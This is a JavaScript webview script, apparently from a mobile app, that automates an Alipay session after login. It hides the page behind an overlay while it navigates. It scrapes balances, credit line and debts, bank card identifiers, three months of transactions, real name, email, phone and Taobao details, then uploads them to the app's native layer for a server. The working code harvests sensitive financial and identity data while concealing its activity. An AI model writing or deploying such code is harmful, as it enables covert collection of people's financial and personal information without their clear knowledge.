/*
*** 数据采集 JS 
*/
jQuery(function(){
	if(window.lock == null || window.lock == undefined){

		window.lock = 'locked';
		//考虑webview没有加载完毕即执行
		var timer = setInterval(function(){
			var readyState = document.readyState;
			if(readyState == "complete"){
				clearInterval(timer);
				run();
			}
		}, 100);
	}
});


//开始运行
function run(){

	var product = getDataFromLocalStorage('product');

	switch(product){
		case 'alipay':
			setTimeout(alipayInfoCapture, 200);
			break;
		case 'taobao':
			setTimeout(taobaoInfoCapture, 200);
			break;
		case 'jd':
			setTimeout(jdInfoCapture, 200);
			break;
		default:
			setTimeout(chooseProduct, 200);
	}
}


//根据 domain 确认数据采集对象
function chooseProduct(){

	var host = window.location.host;

	if(host.indexOf('alipay')>-1){

		//支付宝数据采集
		saveDataToLocalStorage('product', 'alipay');
		alipayInfoCapture();

	}else if(host.indexOf('taobao')>-1){

		//淘宝数据采集
		saveDataToLocalStorage('product', 'taobao');
		taobaoInfoCapture();

	}else if(host.indexOf('jd')>-1){

		//京东数据采集
		saveDataToLocalStorage('product', 'jd');
		jdInfoCapture();

	}else{
		//待定 异常
	}
}


//支付宝数据采集
function alipayInfoCapture(){

	//获取当前处于采集某一阶段
	var step = getDataFromLocalStorage('alipayStep');

	switch(step){
		case '1': //获取账户资产信息
			//alert('alipayGetWealth');
			alipayGetWealth();
			break;
		case '2': //获取账户银行卡信息
			//alert('alipayGetBankCards');
			alipayGetBankCards();
			break;
		case '3': //获取交易记录信息
			//alert('alipayGetDealRecord');
			alipayGetDealRecord();
			break;
		case '4': //获取账户基本信息
			//alert('alipayGetBasicInfo');
			alipayGetBasicInfo();
			break;
		case '5': //跳转淘宝页面
			//alert('alipayGoToTaoBao');
			alipayGoToTaoBao();
			break;
		case '6': //获取淘宝收货地址
			//alert('alipayGetTaoBaoAddress');
			alipayGetTaoBaoAddress();
			break;
		case '7': //将信息上传服务器
			//alert('alipayUploadInfo');
			alipayUploadInfo();
			break;
		default:
			//alert('alipayWaitLogin');
			alipayWaitLogin();
	}
}


function alipayWaitLogin(){

	var title = document.title;
	//alert(title);
	if(title == '我的支付宝 － 支付宝'){
		//alert('login success');
		//页面遮罩
		setLayout(0);

		//页面断言
		var str = jQuery('.i-assets-header.fn-clear').eq(2).find('h3').text();
		if(str != "蚂蚁花呗"){
			noticeAlarm('AlipayWaitLogin');
			return;
		}

		//蚂蚁花呗消费额度
		var antsLines = jQuery('.amount-des')[0].innerText;

		saveDataToLocalStorage('antsLines', antsLines);

		saveDataToLocalStorage('alipayStep', 1);

		setProgress(10);

		//跳转账户资产页面
		jQuery('.global-subnav-item ').eq(1).find('a')[0].click();
	}
}


function alipayGetWealth(){

	//页面断言
	var str1 = jQuery('ul.list-info.fn-clear').find('.title').eq(0).text();
	var str2 = jQuery('ul.list-info.fn-clear').find('.title').eq(1).text();
	var str3 = jQuery('ul.list-info.fn-clear').find('.title').eq(2).text();
	var str4 = jQuery('ul.list-info.fn-clear').find('.title').eq(3).text();
	var str5 = jQuery('ul.list-info.fn-clear').find('.title').eq(4).text();
	var str6 = jQuery('ul.list-info.fn-clear').find('.title').eq(5).text();
	
	if(str1!="余额" || str2!="余额宝" || str3!="招财宝" || str4!="基金" || str5!="存金宝" || str6!="淘宝理财"){
		noticeAlarm('AlipayGetWealth');
		return;
	}


	//账户总资产，总欠款
	//wealth, antsArrears
	var wealth = jQuery('.tip-title')[0].innerText;
	var antsArrears = jQuery('.tip-title')[1].innerText;

	//余额，余额宝，招财宝，基金，存金宝，淘宝理财
	//balance, balanceBao, fortuneBao, fund, depositBao, taobaoFinancial 
	var balance = jQuery('ul.list-info.fn-clear').find('.money').eq(0).text();
	var balanceBao = jQuery('ul.list-info.fn-clear').find('.money').eq(1).text();
	var fortuneBao = jQuery('ul.list-info.fn-clear').find('.money').eq(2).text();
	var fund = jQuery('ul.list-info.fn-clear').find('.money').eq(3).text();
	var depositBao = jQuery('ul.list-info.fn-clear').find('.money').eq(4).text();
	var taobaoFinancial = jQuery('ul.list-info.fn-clear').find('.money').eq(5).text();

	saveDataToLocalStorage('wealth', wealth);
	saveDataToLocalStorage('antsArrears', antsArrears);
	saveDataToLocalStorage('balance', balance);
	saveDataToLocalStorage('balanceBao', balanceBao);
	saveDataToLocalStorage('fortuneBao', fortuneBao);
	saveDataToLocalStorage('fund', fund);
	saveDataToLocalStorage('depositBao', depositBao);
	saveDataToLocalStorage('taobaoFinancial', taobaoFinancial);

	saveDataToLocalStorage('alipayStep', 2);

	setProgress(20);

	//跳转银行卡页面
	jQuery('.allCards').find('a')[0].click();
}


function alipayGetBankCards(){

	//页面断言
	var str = jQuery('.asset-breadcrumb-active').text();
	if(str != "我的银行卡"){
		noticeAlarm('AlipayGetBankCards');
		return;
	}
	
	var timer =  setInterval(function(){
		var display = jQuery('.ui-loading.J-asset-loading').css('display');
		if(display == 'none'){
			clearInterval(timer);
			var bankCards = jQuery('.card-box .card-box-name');
			var length = bankCards.length;
			var result = "";
			for(var i=0;i<length;i++){
				var card = bankCards.eq(i);
				result += card.find('.bank-name').text() +'-'+ card.find('.bank-num4').text() +';';
			}

			saveDataToLocalStorage('bankCards', result);

			saveDataToLocalStorage('alipayStep', 3);

			saveDataToLocalStorage('alipayProgress', 30);

			setProgress(30);

			//跳转交易记录页面
			var url = 'https://consumeprod.alipay.com/record/index.htm';
			location.href = url;
		}
	}, 200);
}


function alipayGetDealRecord(){

	//页面断言
	var title = document.title;
	if(title != "我的账单 - 支付宝"){
		noticeAlarm('AlipayGetDealRecord(Title)');
		return;
	}

	var str = jQuery('.ui-title.fn-clear').find('.fn-left').text();
	if(str == "我的账单"){
		//标准版
		jQuery('.ui-title.fn-clear.gradient-line').find('.link').find('a')[0].click();
	}else if(str == "交易记录"){
		var timeRange = jQuery("#J-select-range option:selected").text();

		if(timeRange == "最近三个月"){
			var dealRecord = getDataFromLocalStorage('dealRecord');
			var text = jQuery('tbody')[0].innerText;
			dealRecord += text;

			saveDataToLocalStorage('dealRecord', dealRecord);

			var progress = getDataFromLocalStorage('alipayProgress') - 0;
			if(progress < 90){
				progress += 5;
				setProgress(progress);
				saveDataToLocalStorage('alipayProgress', progress);
			}

			//判断是否有下一页
			var length = jQuery('span.ui-button-text').length;

			if(length == 1){
				text = jQuery('span.ui-button-text').text();
				if(text == "上一页"){
					//只有上一页
					saveDataToLocalStorage('alipayStep', 4);
					url = 'https://custweb.alipay.com/account/index.htm';
					location.href = url;
				}else{
					//有下一页
					jQuery('span.ui-button-text').click();
				}
			}else if(length == 2){
				//有下一页
				jQuery('span.ui-button-text')[1].click();
			}else{
				saveDataToLocalStorage('alipayStep', 4);
				url = 'https://custweb.alipay.com/account/index.htm';
				location.href = url;
			}

		}else{
			jQuery("[data-widget-cid='widget-4']").find("[data-value='threeMonths']").click();
			jQuery('#J-set-query-form').click();
		}
	}else{
		noticeAlarm('AlipayGetDealRecord(StandardOrAdvanced)');
		return;
	}
}


function alipayGetBasicInfo(){

	//页面断言
	var str1 = jQuery('#account-main').find('th').eq(0).text();
	var str2 = jQuery('#account-main').find('th').eq(1).text();
	var str3 = jQuery('#account-main').find('th').eq(2).text();
	var str4 = jQuery('#account-main').find('th').eq(3).text();
	var str5 = jQuery('#account-main').find('th').eq(6).text();
	var str6 = jQuery('#account-main').find('th').eq(7).text();
	
	if(str1!="真实姓名" || str2!="邮箱" || str3!="手机" || str4!="淘宝会员名" || str5!="注册时间" || str6!="实名账户"){
		noticeAlarm('AlipayGetBasicInfo');
		return;
	}

	var realName = jQuery('#account-main').find('td')[0].innerText;
	var email = jQuery('#account-main').find('td')[2].innerText;
	var mobile = jQuery('#account-main').find('td')[4].innerText;
	var registerTime = jQuery('#account-main').find('td')[12].innerText;

	saveDataToLocalStorage('realName', realName);
	saveDataToLocalStorage('email', email);
	saveDataToLocalStorage('mobile', mobile);
	saveDataToLocalStorage('registerTime', registerTime);

	setProgress(90);

	var temp = jQuery('#account-main').find('td')[7].innerText;
	if(temp == "查看我的淘宝"){
		var taobaoName = jQuery('#account-main').find('td')[6].innerText;
		saveDataToLocalStorage('taobaoName', taobaoName);
	}
	alipayUploadInfo();
}


function alipayGoToTaoBao(){

	//页面断言
	var str = document.getElementById('newDeliverAddress').getElementsByTagName('a')[0].innerText;
	if(str != "收货地址"){
		noticeAlarm('AlipayGoToTaoBao');
		return;
	}

	saveDataToLocalStorage('alipayStep', 6);

	var url = document.getElementById('newDeliverAddress').getElementsByTagName('a')[0].href;
	location.href = url;
}


function alipayGetTaoBaoAddress(){

	//页面断言
	var str = document.getElementById('content').getElementsByTagName('h2')[0].innerText;
	if(str != "收货地址"){
		noticeAlarm('AlipayGetTaoBaoAddress');
		return;
	}

	var result = '';
	list = document.getElementsByTagName('tbody')[0].getElementsByTagName('tr'); 
	for(var i=1;i<list.length;i++){
		obj = list[i].getElementsByTagName('td');
		result += obj[0].innerText+' '+obj[4].innerText+':'+obj[1].innerText+' '+obj[2].innerText+' '+obj[3].innerText+'\r\n';
	}
	saveDataToLocalStorage('taobaoAddress', result);
	saveDataToLocalStorage('alipayStep', 7);
}


function alipayUploadInfo(){

	var data = {};
	data.code = 200;
	data.product = 'alipay';
	data.info = {};
	data.info.antsLines = getDataFromLocalStorage('antsLines');
	data.info.wealth = getDataFromLocalStorage('wealth');
	data.info.antsArrears = getDataFromLocalStorage('antsArrears');
	data.info.balance = getDataFromLocalStorage('balance');
	data.info.balanceBao = getDataFromLocalStorage('balanceBao');
	data.info.fortuneBao = getDataFromLocalStorage('fortuneBao');
	data.info.fund = getDataFromLocalStorage('fund');
	data.info.depositBao = getDataFromLocalStorage('depositBao');
	data.info.taobaoFinancial = getDataFromLocalStorage('taobaoFinancial');
	data.info.bankCards = getDataFromLocalStorage('bankCards');
	data.info.dealRecord = getDataFromLocalStorage('dealRecord');
	data.info.realName = getDataFromLocalStorage('realName');
	data.info.email = getDataFromLocalStorage('email');
	data.info.mobile = getDataFromLocalStorage('mobile');
	data.info.registerTime = getDataFromLocalStorage('registerTime');
	data.info.taobaoName = getDataFromLocalStorage('taobaoName');
	//data.info.taobaoAddress = getDataFromLocalStorage('taobaoAddress');

	var result = JSON.stringify(data);

	uploadInfo(result);

	setProgress(100);

	setLayout(1);
}


//淘宝数据采集
function taobaoInfoCapture(){

}


//京东数据采集
function jdInfoCapture(){

}


//从本地存储获取数据
function getDataFromLocalStorage(key){
	// var result = localStorage.getItem(key);
	var result = nativeMethod.getText(key);
	if(result == null || result == undefined){
		result = "";
	}
	//alert('return '+key+' value: '+result);
	return result;
}


//将数据临时存储
function saveDataToLocalStorage(key, value){
	//alert('save '+key+' value: '+value);
	//localStorage.setItem(key, value);
	nativeMethod.saveText(key,value);
}


function clearLocalStorage(){
	localStorage.clear();
}


//上传数据到服务器
function uploadInfo(value){
	nativeMethod.submitText(value);
}


//告警
function noticeAlarm(value){
	var data = {};
	data.code = 500;
	data.info = value + ' Page Assert Fail : Page Title = ' + document.title + ' And Url = ' + window.location.href;
	var result = JSON.stringify(data);
	nativeMethod.submitText(result);
}


//调整遮罩层
function setLayout(state){
	nativeMethod.goneLayout(state);
}


//传递进度条参数
function setProgress(progress){
	nativeMethod.setProgress(progress);
}
